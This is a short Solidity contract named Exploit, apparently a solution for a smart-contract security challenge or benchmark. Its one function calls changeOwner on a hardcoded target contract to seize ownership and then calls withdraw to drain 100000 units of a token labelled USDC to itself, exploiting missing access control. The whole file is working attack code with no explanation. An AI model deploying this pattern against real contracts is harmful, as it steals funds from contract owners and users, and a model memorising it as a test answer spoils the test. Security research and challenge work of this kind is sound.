pragma solidity >=0.8.0 <0.9.0;

interface ITargetLoan {
    function changeOwner(address newOwner) external;
    function withdraw(address token, uint256 amount, address to) external;
}

contract Exploit {
    // constructor functions aren't supported.
    // constructor() {}
    function exploit() public {
        address target = 0xD856e309337dea0D14001C2853D23c9a2e384f8D;
        address USDC = 0x190CaCC70Ba6C8696b6144D67Acf4F5BEE77f713;
        ITargetLoan(target).changeOwner(address(this));
        ITargetLoan(target).withdraw(USDC, 100000, address(this));
    }
}
